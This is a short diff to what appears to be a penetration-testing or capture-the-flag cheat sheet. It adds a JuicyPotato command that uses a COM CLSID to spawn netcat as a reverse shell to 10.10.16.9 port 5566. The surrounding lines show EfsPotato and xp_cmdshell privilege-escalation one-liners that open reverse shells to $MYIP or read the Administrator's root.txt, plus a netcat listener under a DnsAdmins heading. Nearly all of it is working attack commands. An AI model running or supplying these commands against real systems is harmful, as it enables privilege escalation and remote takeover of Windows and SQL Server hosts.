@@ -1467,6 +1467,7 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 5566 -e cmd"
 xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c type C:\Users\Administrator\Desktop\root.txt"
+C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe 10.10.16.9 5566 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 
 +---------- DnsAdmins ----------+
 rlwrap nc -lvnp 5555
